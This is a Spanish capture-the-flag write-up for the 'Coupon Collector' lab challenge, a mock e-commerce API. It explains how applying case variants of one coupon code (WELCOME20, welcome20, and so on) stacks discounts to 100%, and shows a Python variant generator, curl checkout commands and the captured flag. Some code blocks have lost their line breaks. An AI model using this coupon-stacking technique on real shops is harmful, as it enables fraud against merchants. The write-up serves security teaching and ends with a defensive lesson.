
![[Pasted image 20260704120240.png]]

## 🎯 El reto

ShopEZ es una API REST de e-commerce con sesiones por cookie. Endpoints: `/api/products`, `/api/cart`, `/api/apply-coupon`, `/api/checkout`. Cupón anunciado: `WELCOME20` (20% de descuento).

## 🔍 Reconocimiento

|Endpoint|Método|Resultado|
|---|---|---|
|`/api/products`|GET|Lista de productos|
|`/api/cart`|GET|Carrito (vacío al inicio)|
|`/api/cart`|POST|Añade producto: `{"product_id": 1, "quantity": 1}`|
|`/api/apply-coupon`|POST|Requiere `{"coupon": "..."}` (no `code` ni `coupon_code`)|
|`/api/checkout`|POST|Cierra el pedido y entrega la flag|

Aplicar el mismo código dos veces devolvía `{"error":"Coupon already applied"}`, así que el servidor sí llevaba un registro de cupones usados.

## 🐛 La vulnerabilidad

**Comparación case-sensitive en la lista de "cupones ya aplicados", pero validación case-insensitive del código como "válido".**

El backend probablemente hace algo equivalente a:

```python
if code.upper() == "WELCOME20":       # válido sin importar mayúsculas
    if code in applied_coupons:       # pero el duplicado se compara EXACTO (case-sensitive)
        return error("already applied")
    applied_coupons.append(code)
    discount += 20
```

Resultado: `"WELCOME20"`, `"welcome20"`, `"Welcome20"`, `"weLcoMe20"`, etc. son **cupones distintos** para el filtro de duplicados, pero **todos otorgan el mismo 20% de descuento**. El nombre del reto ("Coupon Collector" = coleccionista de cupones) era la pista: había que "coleccionar" variantes de mayúsculas/minúsculas del mismo código.

## 🛠️ Proceso de explotación

1. **Probar el mismo código dos veces** → bloqueado (`already applied`).
2. **Probar variantes de mayúsculas** (`welcome20`, `Welcome20`) → ¡cada una se aplica y suma otro 20%!
    
    ```
    WELCOME20 -> 20%welcome20 -> 40%Welcome20 -> 60%
    ```
    
3. **Descartado:** race condition (peticiones en paralelo) — el servidor lo maneja bien, no era la vía.
4. **Generar todas las combinaciones de mayúsculas/minúsculas** de `welcome` (2⁷ = 128 variantes) con Python:
    
    ```python
    import itertoolsword = 'welcome'for bits in itertools.product([0,1], repeat=len(word)):    variant = ''.join(c.upper() if b else c.lower() for c,b in zip(word,bits))    print(variant + '20')
    ```
    
5. **Aplicar variantes una por una** hasta que el descuento llegara al 100%:
    
    ```
    weLCOMe20 -> 20%  (total 47.99)WELCOME20 -> 40%  (total 35.99)weLCoMe20 -> 60%  (total 24.00)weLcoMe20 -> 80%  (total 12.00)wELcOme20 -> 100% (total 0.00)  ✅
    ```
    
6. **Checkout con total = 0.00:**
    
    ```bash
    curl -k -c cookies.txt -b cookies.txt -X POST \  https://<host>/api/checkout \  -H "Content-Type: application/json" -d '{}'
    ```
    
    ```json
    {"flag":"flag{219f8dc5a1e5f7de}","message":"Order completed!","order_id":"18874798","total":0.0}
    ```
    

## 🧠 Lección de seguridad

Cuando se normaliza un valor para **validarlo** (case-insensitive), hay que usar esa **misma normalización** para todos los chequeos relacionados — incluida la detección de duplicados. Comparar el valor crudo del usuario en un punto y el valor normalizado en otro abre la puerta a bypasses de lógica de negocio como este.

## 🧰 Herramientas usadas

- `curl -k` (el certificado TLS de la instancia había expirado)
- Cookies de sesión persistentes (`-c cookies.txt -b cookies.txt`)
- Python (`itertools.product`) para generar las combinaciones de mayúsculas/minúsculas
- Bash `while read` para automatizar la aplicación secuencial de cupones